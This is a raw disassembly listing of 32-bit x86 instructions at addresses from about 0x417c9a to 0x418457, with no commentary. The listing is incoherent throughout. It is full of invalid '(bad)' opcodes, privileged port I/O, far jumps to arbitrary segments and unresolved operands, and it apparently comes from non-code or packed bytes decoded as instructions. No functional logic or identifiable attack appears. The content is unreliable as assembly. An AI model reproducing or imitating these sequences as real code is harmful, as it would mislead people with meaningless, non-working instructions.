  417c9a:	sbb    cl,dl
  417c9c:	and    BYTE PTR [ecx-0x69a9ae8b],al
  417ca2:	adc    eax,0x65f70c19
  417ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ca8:	sbb    eax,0x5cd86722
  417cad:	sub    esp,DWORD PTR [eax]
  417caf:	aam    0xf5
  417cb1:	outs   dx,BYTE PTR ds:[esi]
  417cb2:	dec    edi
  417cb3:	scas   eax,DWORD PTR es:[edi]
  417cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cb5:	mov    edx,0x140ca4e7
  417cba:	pushaw 
  417cbc:	adc    DWORD PTR [ecx],esp
  417cbe:	loopne 0x417d2a
  417cc0:	mov    eax,esp
  417cc2:	aaa    
  417cc3:	sbb    eax,DWORD PTR [ecx]
  417cc5:	pop    esi
  417cc6:	xor    cl,BYTE PTR ds:0xd4cc33d4
  417ccc:	gs mov esp,0x8d6c5c7b
  417cd2:	jl     0x417d38
  417cd4:	pop    ss
  417cd5:	daa    
  417cd6:	pop    eax
  417cd7:	xor    bh,dl
  417cd9:	push   eax
  417cda:	(bad)  [ecx+0xf]
  417cdd:	in     eax,dx
  417cde:	retf   
  417cdf:	in     eax,dx
  417ce0:	mov    DWORD PTR [ecx-0x28d3b019],eax
  417ce6:	fstp   st(6)
  417ce8:	and    al,0x70
  417cea:	push   eax
  417ceb:	mov    gs,WORD PTR [edx]
  417ced:	mov    DWORD PTR [ebx*4+0x47b1e2f4],esi
  417cf4:	test   DWORD PTR [edx+0x60],0xb6bd6bea
  417cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cfc:	xchg   ebp,eax
  417cfd:	jle    0x417d64
  417cff:	pop    edx
  417d00:	ja     0x417d49
  417d02:	push   esp
  417d03:	pop    ecx
  417d04:	mov    WORD PTR [ebx],?
  417d06:	jle    0x417cdd
  417d08:	sub    al,0x17
  417d0a:	int3   
  417d0b:	jg     0x417d34
  417d0d:	lods   eax,DWORD PTR ds:[esi]
  417d0e:	nop
  417d0f:	rcl    BYTE PTR [esi+0x7dcf82be],cl
  417d15:	jb     0x417cec
  417d17:	jbe    0x417cbb
  417d19:	sbb    bh,0x41
  417d1c:	call   0xaffa6fcd
  417d21:	stos   BYTE PTR es:[edi],al
  417d22:	test   al,0xf3
  417d24:	outs   dx,DWORD PTR ds:[esi]
  417d25:	jne    0x417da4
  417d27:	gs int3 
  417d29:	loope  0x417d6d
  417d2b:	out    dx,eax
  417d2c:	push   eax
  417d2d:	aaa    
  417d2e:	mov    ecx,0xc22088c5
  417d33:	xlat   BYTE PTR ds:[ebx]
  417d34:	adc    BYTE PTR [ebp+0xf],ch
  417d37:	mov    bh,0xa6
  417d39:	dec    ebx
  417d3a:	jmp    0x8060:0x11b2c980
  417d41:	aas    
  417d42:	lock jmp 0x417db4
  417d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d46:	or     DWORD PTR [edx],esi
  417d48:	fistp  WORD PTR [eax+0x68]
  417d4b:	dec    ebx
  417d4c:	enter  0xd117,0x39
  417d50:	pop    ebp
  417d51:	enter  0x9a71,0x25
  417d55:	popf   
  417d56:	inc    ebp
  417d57:	push   ecx
  417d58:	xor    ah,dh
  417d5a:	cmp    DWORD PTR ds:[esi-0x70],ebx
  417d5e:	jae    0x417d70
  417d60:	fimul  DWORD PTR [esi+0x175275]
  417d66:	mov    eax,DWORD PTR [edi]
  417d68:	test   BYTE PTR [ecx+ebx*8-0xe],bl
  417d6c:	inc    ecx
  417d6d:	or     ch,BYTE PTR [ebx+0x3e]
  417d70:	push   ebp
  417d71:	inc    edx
  417d72:	dec    edi
  417d73:	adc    eax,0x83c7337c
  417d78:	xor    esi,DWORD PTR [ecx-0x5d]
  417d7b:	xchg   DWORD PTR [edx-0x9],esp
  417d7e:	ficom  DWORD PTR [eax+esi*8-0x28]
  417d82:	lods   eax,DWORD PTR ds:[esi]
  417d83:	ss jb  0x417d8c
  417d86:	scas   eax,DWORD PTR es:[edi]
  417d87:	scas   eax,DWORD PTR es:[edi]
  417d88:	jge    0x417d3c
  417d8a:	sub    bh,ah
  417d8c:	mov    edx,DWORD PTR [ebp+ecx*2-0x7ab0dd63]
  417d93:	hlt    
  417d94:	and    BYTE PTR ds:0xf85972f,0x6d
  417d9b:	out    dx,eax
  417d9c:	cld    
  417d9d:	je     0x417da1
  417d9f:	out    0xa4,eax
  417da1:	fisubr DWORD PTR [ecx]
  417da3:	mov    dh,0x4c
  417da5:	cdq    
  417da6:	lock xchg BYTE PTR [esi],dl
  417da9:	das    
  417daa:	xchg   esi,eax
  417dab:	call   DWORD PTR [eax]
  417dad:	jle    0x417d53
  417daf:	xchg   ebx,eax
  417db0:	dec    ebx
  417db1:	out    0xef,eax
  417db3:	jno    0x417da4
  417db5:	fisttp DWORD PTR [ebp-0xc]
  417db8:	mov    WORD PTR [edi+0x4cde25ba],fs
  417dbe:	mov    ecx,0x52c36140
  417dc3:	inc    edx
  417dc4:	jno    0x417d88
  417dc6:	dec    ecx
  417dc7:	(bad)  
  417dc8:	nop
  417dc9:	cli    
  417dca:	sub    al,0xcd
  417dcc:	outs   dx,BYTE PTR ds:[esi]
  417dcd:	cmc    
  417dce:	mov    esi,0x2ba6ed4f
  417dd3:	popa   
  417dd4:	cmp    BYTE PTR [ebx+esi*4-0x42],cl
  417dd8:	pop    ebx
  417dd9:	dec    ebx
  417dda:	imul   edi,DWORD PTR [ecx+0x48],0x25bda8fa
  417de1:	cmp    edi,esp
  417de3:	mov    dh,0xba
  417de5:	inc    ecx
  417de6:	loope  0x417d96
  417de8:	inc    ebx
  417de9:	cs inc ecx
  417deb:	lods   eax,DWORD PTR ds:[esi]
  417dec:	cmp    ecx,eax
  417dee:	dec    ebp
  417def:	jns    0x417e41
  417df1:	mov    bl,0xf3
  417df3:	fld    TBYTE PTR [ebx+ebp*4+0x45]
  417df7:	lea    ebp,[edx]
  417df9:	or     al,0xd4
  417dfb:	adc    ebp,DWORD PTR [edx-0x69f4f37a]
  417e01:	addr16 es mov esp,0x85720599
  417e08:	lds    ebx,FWORD PTR [edi+edi*4]
  417e0b:	scas   eax,DWORD PTR es:[edi]
  417e0c:	inc    ebp
  417e0d:	dec    ebx
  417e0e:	push   es
  417e0f:	jle    0x417dd9
  417e11:	sub    esi,eax
  417e13:	fldenv ds:0xb61270ee
  417e19:	ret    0xc7f5
  417e1c:	xor    DWORD PTR ds:0x90883210,esi
  417e22:	push   edi
  417e23:	test   eax,0x2b2e8768
  417e28:	cdq    
  417e29:	pop    ss
  417e2a:	mov    eax,0x145492b5
  417e2f:	dec    esp
  417e30:	cld    
  417e31:	pop    ds
  417e32:	cmp    eax,0xdccafcb5
  417e37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e38:	push   ebx
  417e39:	push   esp
  417e3a:	outs   dx,DWORD PTR ds:[esi]
  417e3b:	push   ebx
  417e3c:	invd   
  417e3e:	xor    eax,eax
  417e40:	popf   
  417e41:	dec    edx
  417e42:	push   ebx
  417e43:	int    0xba
  417e45:	(bad)  [edi+0x53e275bb]
  417e4b:	outs   dx,DWORD PTR ds:[esi]
  417e4c:	in     eax,dx
  417e4d:	mov    esp,0x572c7850
  417e52:	(bad)  
  417e53:	lock addr16 inc ebx
  417e56:	sahf   
  417e57:	pop    edi
  417e58:	or     al,0x4d
  417e5a:	leave  
  417e5b:	or     bh,BYTE PTR [esi-0x381c229d]
  417e61:	push   ebp
  417e62:	xchg   esi,eax
  417e63:	mov    ss,WORD PTR [edi]
  417e65:	(bad)  
  417e67:	das    
  417e68:	push   ebp
  417e69:	or     ch,cl
  417e6b:	mov    al,ds:0xb81065df
  417e70:	and    DWORD PTR [esi],edx
  417e72:	sub    eax,0x295c93d4
  417e77:	dec    edx
  417e78:	xor    dl,bh
  417e7a:	shr    DWORD PTR [eax],0x3d
  417e7d:	addr16 pop eax
  417e7f:	ret    
  417e80:	fst    QWORD PTR ds:[eax-0x72]
  417e84:	retf   
  417e85:	mov    esp,0x3f98d35a
  417e8a:	sbb    DWORD PTR [ebx],ebp
  417e8c:	popf   
  417e8d:	mov    esi,0xa746dece
  417e92:	loop   0x417ed6
  417e94:	not    DWORD PTR [ecx-0x76]
  417e97:	ret    0x54cc
  417e9a:	jmp    0x417e3e
  417e9c:	adc    edx,ebp
  417e9e:	push   esi
  417e9f:	adc    BYTE PTR [eax+esi*4+0x4c],dl
  417ea3:	sahf   
  417ea4:	fild   WORD PTR [ecx]
  417ea6:	nop
  417ea7:	add    al,0x7a
  417ea9:	retf   0x7ba1
  417eac:	ror    BYTE PTR [ecx-0x3c],1
  417eaf:	fwait
  417eb0:	and    DWORD PTR [ebx+0x21],ebp
  417eb3:	pop    ss
  417eb4:	nop    DWORD PTR [ecx-0x34]
  417eb8:	jo     0x417f21
  417eba:	js     0x417f00
  417ebc:	mov    al,0x6d
  417ebe:	push   esp
  417ebf:	jmp    0xfe0f36f3
  417ec4:	sub    dl,bl
  417ec6:	or     BYTE PTR [ebx-0x30],cl
  417ec9:	pop    ds
  417eca:	xchg   edi,eax
  417ecb:	or     BYTE PTR [ebp-0x53],al
  417ece:	loop   0x417f25
  417ed0:	arpl   bp,di
  417ed2:	cmp    eax,0x2059a0f0
  417ed7:	pop    esp
  417ed8:	push   ss
  417ed9:	cmp    ecx,DWORD PTR [ecx]
  417edb:	mov    eax,0xd5fb7838
  417ee0:	js     0x417efd
  417ee2:	ss loopne 0x417e66
  417ee5:	hlt    
  417ee6:	imul   esp,eax,0xffffff85
  417ee9:	xlat   BYTE PTR ds:[ebx]
  417eea:	push   ds
  417eeb:	dec    ebp
  417eec:	xchg   ebp,eax
  417eed:	sub    eax,0xdb2eed83
  417ef2:	xor    BYTE PTR [ecx],ch
  417ef4:	pop    esi
  417ef5:	mov    ds:0xa3efdd7e,al
  417efa:	or     bl,BYTE PTR [ebx]
  417efc:	jnp    0x417ec4
  417efe:	mov    ebx,0xd6472d5c
  417f03:	jns    0x417f6f
  417f05:	sub    eax,0x14104eb5
  417f0a:	or     DWORD PTR ds:0xe9255f55,edx
  417f10:	xchg   esi,eax
  417f11:	mov    esp,0x823aa57
  417f16:	fdivr  DWORD PTR [esi]
  417f18:	enter  0x7293,0xc0
  417f1c:	in     al,0x98
  417f1e:	and    edx,edx
  417f20:	mov    al,0x62
  417f22:	sbb    al,0xf0
  417f24:	jns    0x417f4a
  417f26:	ins    DWORD PTR es:[edi],dx
  417f27:	dec    ecx
  417f28:	push   esi
  417f29:	addr16 clc 
  417f2b:	xchg   ebx,eax
  417f2c:	test   al,0xdf
  417f2e:	call   0x8bde:0x26d2ab46
  417f35:	scas   al,BYTE PTR es:[edi]
  417f36:	lods   al,BYTE PTR ds:[esi]
  417f37:	(bad)  
  417f38:	cmc    
  417f39:	push   ss
  417f3a:	(bad)  
  417f3b:	xchg   ebx,eax
  417f3c:	inc    esp
  417f3d:	cmp    edi,DWORD PTR [eax+edx*8+0x50b4e0bd]
  417f44:	in     al,dx
  417f45:	sahf   
  417f46:	cmp    DWORD PTR [edx+edi*2+0x52204828],esp
  417f4d:	pushf  
  417f4e:	addr16 hlt 
  417f50:	dec    cl
  417f52:	das    
  417f53:	mov    eax,0x7acfc713
  417f58:	jmp    0xf056:0x6770ffd7
  417f5f:	push   ss
  417f60:	test   eax,0xabd27e9d
  417f65:	pop    esi
  417f66:	sahf   
  417f67:	pop    edx
  417f68:	dec    edx
  417f69:	ins    DWORD PTR es:[edi],dx
  417f6a:	cdq    
  417f6b:	mov    ds:0xe6a68b1b,al
  417f70:	scas   al,BYTE PTR es:[edi]
  417f71:	out    dx,al
  417f72:	push   ebx
  417f73:	in     eax,dx
  417f74:	ja     0x417fef
  417f76:	adc    al,0x89
  417f78:	xor    BYTE PTR ds:0xc6034236,cl
  417f7e:	std    
  417f7f:	jmp    0xfc7123df
  417f84:	cmp    al,0x32
  417f86:	lea    ebx,[edx]
  417f88:	mov    ah,0x29
  417f8a:	into   
  417f8b:	scas   eax,DWORD PTR es:[edi]
  417f8c:	in     eax,dx
  417f8d:	pop    esi
  417f8e:	dec    eax
  417f8f:	mov    dh,BYTE PTR [eax+0x28]
  417f92:	dec    ebx
  417f93:	inc    ecx
  417f94:	xchg   esi,eax
  417f95:	mov    ah,0xf1
  417f97:	fwait
  417f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f99:	mov    WORD PTR [edi-0x18],ds
  417f9c:	(bad)
  417f9f:	push   0xfffffff0
  417fa1:	dec    esi
  417fa2:	mov    ah,0xec
  417fa4:	(bad)  
  417fa5:	mov    esi,0x94fb8717
  417faa:	lods   eax,DWORD PTR ds:[esi]
  417fab:	mov    DWORD PTR ds:0x520041a1,ecx
  417fb1:	out    dx,eax
  417fb2:	adc    DWORD PTR [ecx+edx*1+0x5fd62dd6],0xfb556eab
  417fbd:	jmp    0xebd0ac93
  417fc2:	sbb    eax,0xb17bc730
  417fc7:	cmp    BYTE PTR [ebx+0x5d],al
  417fca:	adc    ah,bh
  417fcc:	(bad)  
  417fcd:	test   al,0xe4
  417fcf:	outs   dx,DWORD PTR ds:[esi]
  417fd0:	in     al,dx
  417fd1:	jno    0x417ff8
  417fd3:	ror    DWORD PTR ds:0xe10b5e87,1
  417fd9:	xchg   ebx,eax
  417fda:	xor    eax,0x874c51c7
  417fdf:	in     eax,dx
  417fe0:	ret    0x2814
  417fe3:	repnz mov BYTE PTR [esi-0x58e1be8f],cl
  417fea:	aas    
  417feb:	mov    bh,0x2e
  417fed:	xchg   DWORD PTR [eax+0x6f],ebp
  417ff0:	pop    ecx
  417ff1:	fdivrp st(6),st
  417ff3:	push   edx
  417ff4:	dec    esp
  417ff5:	sub    BYTE PTR [ebp-0x2b2eedfa],0xa5
  417ffc:	scas   al,BYTE PTR es:[edi]
  417ffd:	jmp    0x41805d
  417fff:	pusha  
  418000:	mov    ds:0x49b0a8e1,al
  418005:	dec    DWORD PTR ds:0x61c84871
  41800c:	call   0xf7f0:0xe428bfc5
  418013:	out    dx,eax
  418014:	jp     0x418092
  418016:	mov    eax,DWORD PTR [eax]
  418018:	jbe    0x418030
  41801a:	mov    ?,WORD PTR [ebx+esi*4]
  41801d:	bound  ebp,QWORD PTR [esi]
  41801f:	aaa    
  418020:	stc    
  418021:	retf   0xb691
  418024:	or     edi,DWORD PTR [esi]
  418026:	fxch   st(4)
  418028:	mov    al,ds:0x43a16543
  41802d:	mov    WORD PTR ds:0xc0cc6f47,ss
  418033:	(bad)  
  418034:	or     BYTE PTR [ebp+ecx*8-0x689ae575],al
  41803b:	(bad)  
  41803c:	aam    0xf7
  41803e:	mov    al,ds:0xefe4977b
  418043:	test   al,0x4
  418045:	cmc    
  418046:	data16 and al,0xf0
  418049:	pop    ebp
  41804a:	inc    edx
  41804b:	cmp    BYTE PTR ds:[edi-0x6d4b5130],al
  418052:	mov    ss,WORD PTR [eax+ecx*2-0x1c221314]
  418059:	jbe    0x4180c8
  41805b:	sub    eax,0x9e3fd189
  418060:	mov    BYTE PTR [ebx+ebx*1+0x4a],ah
  418064:	lea    edi,[esi-0xec47ed4]
  41806a:	mov    ah,0x7a
  41806c:	adc    al,0x88
  41806e:	sar    esp,0xae
  418071:	or     BYTE PTR [ebp+0x606aee81],ah
  418077:	(bad)  
  418079:	adc    bl,ah
  41807b:	(bad)
  41807e:	inc    ebp
  41807f:	jmp    0xe9528acb
  418084:	ins    BYTE PTR es:[edi],dx
  418085:	imul   ebp,DWORD PTR [ebp+0x2598f006],0x84925470
  41808f:	adc    ebp,DWORD PTR gs:[edx+ecx*2-0x72]
  418094:	xchg   ebp,ebx
  418096:	imul   ecx,edi,0xa36f7e57
  41809c:	mov    ebp,0x24c4d463
  4180a1:	mov    esi,0xd5c17b61
  4180a6:	aas    
  4180a7:	mov    esp,0xb91fb7de
  4180ac:	push   cs
  4180ad:	aas    
  4180ae:	xor    esp,DWORD PTR [eax+ebp*2-0x6f135479]
  4180b5:	jmp    0x4180ad
  4180b7:	add    esp,DWORD PTR [edx]
  4180b9:	cmp    BYTE PTR [esi],dh
  4180bb:	stos   BYTE PTR es:[edi],al
  4180bc:	mov    ch,0x9a
  4180be:	sbb    BYTE PTR [ecx+ecx*2],bl
  4180c1:	jl     0x41805b
  4180c3:	push   es
  4180c4:	push   eax
  4180c5:	xchg   edx,eax
  4180c6:	inc    ebx
  4180c7:	inc    ebx
  4180c8:	popf   
  4180c9:	ret    
  4180ca:	xor    DWORD PTR [esp-0x7a],edx
  4180ce:	ror    DWORD PTR [esi-0x21],1
  4180d1:	ret    
  4180d2:	in     al,dx
  4180d3:	xor    al,0x8c
  4180d5:	repnz ins BYTE PTR es:[edi],dx
  4180d7:	pop    ebx
  4180d8:	jmp    0x4180f2
  4180da:	sub    esi,DWORD PTR [ebp-0x15]
  4180dd:	ins    DWORD PTR es:[edi],dx
  4180de:	pop    ecx
  4180df:	cli    
  4180e0:	jmp    0x418126
  4180e2:	sub    DWORD PTR [esi-0x29],ebx
  4180e5:	jno    0x418129
  4180e7:	stos   BYTE PTR es:[edi],al
  4180e8:	fidivr WORD PTR [edx-0xa]
  4180eb:	fst    st(0)
  4180ed:	sub    DWORD PTR [edi+0x62764eee],eax
  4180f3:	call   0x415e:0xaaaa1bbc
  4180fa:	mov    dh,0xec
  4180fc:	sbb    DWORD PTR [edx+esi*1+0x6d],edx
  418100:	cld    
  418101:	mov    dl,al
  418103:	and    DWORD PTR [ebx-0x1b],0x46
  418107:	jbe    0x418133
  418109:	inc    ecx
  41810a:	int    0x8d
  41810c:	aas    
  41810d:	mov    ds:0xfaab7cc8,al
  418112:	inc    ebx
  418113:	xor    al,0xd4
  418115:	cmp    esi,0x551f7e8e
  41811b:	jg     0x41811e
  41811d:	xlat   BYTE PTR ds:[ebx]
  41811e:	arpl   WORD PTR [edx+0x7b],ax
  418121:	jo     0x418178
  418123:	dec    edx
  418124:	fwait
  418125:	push   ebx
  418126:	cli    
  418127:	scas   eax,DWORD PTR es:[edi]
  418128:	fld    DWORD PTR [edx-0x317182d9]
  41812e:	sub    eax,0xc3a5417f
  418133:	cmp    edx,DWORD PTR [eax+0x5c]
  418136:	test   eax,0x32578696
  41813b:	xchg   ebx,eax
  41813c:	ror    DWORD PTR [esp+ecx*4-0x80],1
  418140:	sbb    DWORD PTR [edi-0x5d93797f],0xffffffda
  418147:	test   eax,0x993e89c3
  41814c:	cld    
  41814d:	cmp    al,0xb9
  41814f:	dec    ah
  418151:	xchg   edi,eax
  418152:	in     al,dx
  418153:	push   0x4b
  418155:	repnz call 0x49fe:0x89b496ad
  41815d:	ficom  DWORD PTR [ebx+0x1a1d8744]
  418163:	adc    eax,0xcbf1aabb
  418168:	in     al,0x42
  41816a:	lods   eax,DWORD PTR ds:[esi]
  41816b:	mov    edx,0xfc1cb8c5
  418170:	xor    eax,0xc9aa1ea6
  418175:	adc    DWORD PTR [eax],0x63
  418178:	je     0x4181c4
  41817a:	add    BYTE PTR [esi-0x3],dl
  41817d:	call   0x9841ddf5
  418182:	xlat   BYTE PTR ds:[ebx]
  418183:	test   al,0xd5
  418185:	ret    0xe752
  418188:	ins    BYTE PTR es:[edi],dx
  418189:	loop   0x4181e6
  41818b:	stos   BYTE PTR es:[edi],al
  41818c:	ins    DWORD PTR es:[edi],dx
  41818d:	sbb    edx,DWORD PTR [edi+edx*2]
  418190:	out    0xd3,eax
  418192:	stc    
  418193:	(bad)  
  418194:	xchg   ebp,eax
  418195:	push   ebp
  418196:	sub    BYTE PTR [ebp+0x14d868b6],dl
  41819c:	scas   eax,DWORD PTR es:[edi]
  41819d:	loopne 0x418134
  41819f:	hlt    
  4181a0:	jmp    0x4181d9
  4181a2:	or     dl,BYTE PTR [eax]
  4181a4:	mov    ebp,0x787aa452
  4181a9:	ret    0x6cef
  4181ac:	mov    edi,ecx
  4181ae:	mov    dl,BYTE PTR [esi]
  4181b0:	pop    esp
  4181b1:	lods   eax,DWORD PTR ds:[esi]
  4181b2:	sbb    BYTE PTR [ecx+0x1f],ah
  4181b5:	mov    ecx,0xa84429a0
  4181ba:	imul   DWORD PTR [ebp-0x2ecc6453]
  4181c0:	mov    bl,0xdf
  4181c2:	cmc    
  4181c3:	sar    BYTE PTR [eax+0x40832256],0x24
  4181ca:	adc    esi,DWORD PTR [ecx-0x6fb0b308]
  4181d0:	xchg   ecx,eax
  4181d2:	hlt    
  4181d3:	int3   
  4181d4:	xor    al,0xd9
  4181d6:	push   cs
  4181d7:	shl    ah,cl
  4181d9:	test   BYTE PTR [edx-0x7e],bl
  4181dc:	jnp    0x4181d5
  4181de:	xor    eax,0xc4501444
  4181e3:	dec    BYTE PTR [ebp+0x52]
  4181e6:	push   ecx
  4181e7:	mov    esp,DWORD PTR [ecx-0x56e01bdb]
  4181ed:	inc    ebp
  4181ee:	into   
  4181ef:	pop    ecx
  4181f0:	jmp    0x418200
  4181f2:	and    DWORD PTR [ebx-0x26671f09],edx
  4181f8:	leave  
  4181f9:	ds (bad) 
  4181fb:	adc    eax,0xb6bf3707
  418200:	mov    bl,0xab
  418202:	mov    ch,0x88
  418204:	dec    ebp
  418205:	mov    ebx,0xac3dbc8b
  41820a:	in     eax,0xf8
  41820c:	in     eax,dx
  41820d:	add    DWORD PTR [esi],0x50
  418210:	push   cs
  418211:	stc    
  418212:	lea    esp,[eax+0x12]
  418215:	aad    0xd9
  418217:	fnstcw WORD PTR [ebx-0x754547f7]
  41821d:	push   ebx
  41821e:	ds inc ebx
  418220:	dec    ebx
  418221:	scas   eax,DWORD PTR es:[edi]
  418222:	jl     0x418202
  418224:	mov    dl,0x59
  418226:	adc    edx,DWORD PTR [edi+0x5f]
  418229:	add    DWORD PTR [edi],eax
  41822b:	lods   al,BYTE PTR ds:[esi]
  41822c:	sti    
  41822d:	mov    ecx,0xa76afe94
  418232:	push   0xffffff9e
  418234:	(bad)  
  418235:	push   esi
  418236:	dec    edx
  418237:	add    BYTE PTR [esi],cl
  418239:	sbb    al,BYTE PTR [ebp-0x8]
  41823c:	xchg   BYTE PTR [edx],cl
  41823e:	pushf  
  41823f:	lahf   
  418240:	add    ch,al
  418242:	fs pop es
  418244:	dec    ecx
  418245:	call   0x692bc75e
  41824a:	in     eax,dx
  41824b:	jae    0x41826b
  41824d:	push   0x6f
  41824f:	mov    ecx,0xdd27b685
  418254:	jno    0x4182d5
  418256:	(bad)  
  418257:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  418259:	shr    edi,cl
  41825b:	sub    al,0x35
  41825d:	jmp    0x41828b
  41825f:	je     0x4182cd
  418261:	dec    eax
  418262:	xchg   esp,eax
  418263:	ret    
  418264:	leave  
  418265:	cmp    DWORD PTR [eax-0x3e],esp
  418268:	add    eax,edi
  41826a:	inc    esi
  41826b:	or     dh,BYTE PTR [ecx+0x21d58c2b]
  418271:	imul   esi,esi,0xffffff9d
  418274:	push   0x55
  418276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418277:	sbb    al,0x54
  418279:	mov    bl,0x9c
  41827b:	test   eax,0xcd2f3759
  418280:	fdivr  QWORD PTR [edx]
  418282:	dec    esi
  418283:	pop    ecx
  418284:	sub    BYTE PTR [eax-0x6788e025],al
  41828a:	ret    0xeb3a
  41828d:	pop    ebx
  41828e:	test   al,0x4f
  418290:	inc    esi
  418291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418292:	arpl   WORD PTR [ecx-0x54e23d48],si
  418298:	xchg   BYTE PTR [edx+0x4f],dh
  41829b:	stc    
  41829c:	repz cli 
  41829e:	popa   
  41829f:	test   edi,0x2b1e23aa
  4182a5:	push   0xfffffff6
  4182a7:	jbe    0x418287
  4182a9:	push   edi
  4182aa:	fiadd  DWORD PTR [ebx+0x43c40b73]
  4182b0:	int3   
  4182b1:	clc    
  4182b2:	jmp    0x418318
  4182b4:	and    edi,esi
  4182b6:	push   ecx
  4182b7:	sbb    al,0x47
  4182b9:	xchg   edi,eax
  4182ba:	fild   WORD PTR [ecx+0x31]
  4182bd:	inc    edi
  4182be:	pop    esi
  4182bf:	imul   esp,DWORD PTR [eax],0x6e
  4182c2:	adc    eax,0xdeb5e2c9
  4182c7:	shl    DWORD PTR ds:0x724751f5,cl
  4182cd:	adc    ch,BYTE PTR [edi+ebx*1]
  4182d0:	out    dx,eax
  4182d1:	adc    al,0x83
  4182d3:	mov    edx,0x9beaad7
  4182d8:	sub    al,0x7e
  4182da:	aas    
  4182db:	and    ebp,DWORD PTR [esi-0xd]
  4182de:	push   es
  4182df:	rol    DWORD PTR [edx-0x8f48e43],0x58
  4182e6:	gs call 0x76ae0105
  4182ec:	inc    esi
  4182ed:	enter  0x8921,0x1a
  4182f1:	sub    BYTE PTR [edi-0x1876df16],ch
  4182f7:	fnstenv [ebp+0x1daa0526]
  4182fd:	out    dx,eax
  4182fe:	mov    dl,0xa0
  418300:	add    al,0xac
  418302:	xchg   esp,eax
  418303:	push   edx
  418304:	sbb    eax,0x671db557
  418309:	dec    ebp
  41830a:	lds    eax,FWORD PTR [ecx-0x459238e0]
  418310:	repnz repz pop ebp
  418313:	scas   eax,DWORD PTR es:[edi]
  418314:	repz mov ebp,ebp
  418317:	pop    eax
  418318:	pop    ds
  418319:	arpl   WORD PTR [esi-0x61ea17d9],bx
  41831f:	fnstenv [edi+0x615457f0]
  418325:	mov    dl,0x7c
  418327:	add    eax,0x711c3fa
  41832c:	je     0x41837a
  41832e:	add    BYTE PTR [ebx],ah
  418330:	cmc    
  418331:	adc    BYTE PTR [ebx-0x168375d9],0xac
  418338:	pop    edi
  418339:	das    
  41833a:	je     0x41832b
  41833c:	mov    al,0xe0
  41833e:	and    al,0x67
  418340:	fst    DWORD PTR [ebx]
  418342:	mov    WORD PTR [eax-0x7e917aaa],?
  418348:	fstp   QWORD PTR [edi]
  41834a:	ret    
  41834b:	loop   0x41836c
  41834d:	mov    ds:0x9982ee3d,eax
  418352:	dec    edi
  418353:	add    eax,0x3f567ad0
  418358:	cmp    al,0xab
  41835a:	sub    esi,edx
  41835c:	dec    esi
  41835d:	mov    ?,WORD PTR [ebp-0x79]
  418360:	and    al,0xdc
  418362:	mov    edx,0x2a05f92a
  418367:	ja     0x41835d
  418369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41836a:	call   0xbcc2e0e0
  41836f:	mov    cl,BYTE PTR [ebx]
  418371:	daa    
  418372:	repnz fistp DWORD PTR [ebx+0x231599fa]
  418379:	inc    esi
  41837a:	test   dh,al
  41837c:	jle    0x4183d8
  41837e:	dec    edi
  41837f:	xchg   ebx,eax
  418380:	shl    DWORD PTR [edx],1
  418382:	jl     0x4183dc
  418384:	and    ebx,DWORD PTR [eax+0x6d6a5129]
  41838a:	push   esp
  41838b:	jnp    0x41830d
  41838d:	stos   BYTE PTR es:[edi],al
  41838e:	jmp    0x418373
  418390:	jmp    0x4aa1:0x85cff238
  418397:	mov    esi,0xfadd04b3
  41839c:	add    al,0x91
  41839e:	mov    ah,0x1a
  4183a0:	push   ss
  4183a1:	cmp    DWORD PTR [esi-0x4b836c84],edx
  4183a7:	sub    BYTE PTR [esi],dl
  4183a9:	push   ebx
  4183aa:	xchg   ebx,eax
  4183ab:	dec    ebx
  4183ac:	iret   
  4183ad:	xor    ebx,0xed654cb7
  4183b3:	xchg   ebx,eax
  4183b4:	and    DWORD PTR [esi+0x699db47a],0xffffffec
  4183bb:	lds    eax,FWORD PTR [esi+0x6c]
  4183be:	jle    0x41835b
  4183c0:	xchg   ebp,eax
  4183c1:	jbe    0x418343
  4183c3:	retf   
  4183c4:	mov    esi,0x16e09aac
  4183c9:	ficom  DWORD PTR [eax-0x2c282daa]
  4183cf:	mov    ch,0xe4
  4183d1:	fwait
  4183d2:	dec    ecx
  4183d3:	jg     0x4183e1
  4183d5:	pop    edi
  4183d6:	fsub   QWORD PTR [edi-0x60]
  4183d9:	and    al,0x7
  4183db:	sub    DWORD PTR [ecx],esi
  4183dd:	jp     0x418360
  4183df:	dec    ebp
  4183e0:	verr   ax
  4183e3:	add    al,0xa
  4183e5:	cwde   
  4183e6:	sub    dh,BYTE PTR [ebp+eax*1-0x11]
  4183ea:	sbb    bl,BYTE PTR [ebx]
  4183ec:	ss or  eax,0x91276ac
  4183f2:	ret    
  4183f3:	pop    ecx
  4183f4:	cli    
  4183f5:	mov    ?,WORD PTR [ebx]
  4183f7:	dec    ebp
  4183f8:	mov    eax,0xd8c1d2ce
  4183fd:	push   0x38
  4183ff:	lods   al,BYTE PTR ds:[esi]
  418400:	dec    ecx
  418401:	ds push ebp
  418403:	and    dh,cl
  418405:	icebp  
  418406:	adc    edi,edi
  418408:	mov    ss:0xbd84fef6,al
  41840e:	or     eax,0x7f5cea7f
  418413:	jge    0x418440
  418415:	aaa    
  418416:	push   edx
  418417:	and    eax,0xde9522e0
  41841c:	mov    ch,0x60
  41841e:	dec    esp
  41841f:	xor    eax,0x7eb89b18
  418424:	push   es
  418425:	pusha  
  418426:	call   0x9ddd:0xa2e98508
  41842d:	mov    ebx,0x499802b3
  418432:	in     eax,0xfd
  418434:	lea    esp,[edx+0x4]
  418437:	cmp    eax,0x14bfcf1e
  41843c:	mov    ch,0xb3
  41843e:	inc    ebx
  41843f:	push   0x4b
  418441:	cmp    ebx,0xffffffa4
  418444:	jecxz  0x418467
  418446:	adc    edx,DWORD PTR [esi+eax*2+0x45]
  41844a:	ret    0x7c69
  41844d:	shr    BYTE PTR [eax],1
  41844f:	push   ebx
  418450:	loop   0x4184ae
  418452:	js     0x418481
  418454:	sbb    al,0x29
  418456:	(bad)  
  418457:	cmp    ebp,DWORD PTR [ebx+0x277feeb]
